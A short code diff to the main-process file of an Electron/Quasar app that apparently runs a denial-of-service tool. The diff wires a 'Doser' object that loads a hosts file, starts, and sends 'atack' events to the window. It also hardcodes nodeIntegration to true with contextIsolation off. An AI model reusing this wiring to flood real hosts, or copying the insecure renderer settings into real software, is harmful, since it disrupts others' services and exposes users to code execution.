@@ -27,12 +27,12 @@ function createWindow () {
     webPreferences: {
       contextIsolation: false,
       // More info: /quasar-cli/developing-electron-apps/electron-preload-script
-      nodeIntegration: process.env.QUASAR_NODE_INTEGRATION,
-      nodeIntegrationInWorker: process.env.QUASAR_NODE_INTEGRATION
-
+      nodeIntegration: true,
+      nodeIntegrationInWorker: true
     }
   })
 
+  mainWindow.setMenu(null)
   mainWindow.loadURL(process.env.APP_URL)
 
   if (process.env.DEBUGGING) {
@@ -50,9 +50,10 @@ function createWindow () {
   })
 
   const doser = new Doser(false, 1)
+  const window = mainWindow
+  doser.listen('atack', (data) => window.webContents.send('atack', data))
+  doser.listen('error', (data) => window.webContents.send('error', data))
   doser.loadHostsFile().then(() => {
-    doser.listen('atack', mainWindow.webContents.send)
-    doser.listen('error', mainWindow.webContents.send)
     doser.start()
   }).catch(() => {
     app.quit()
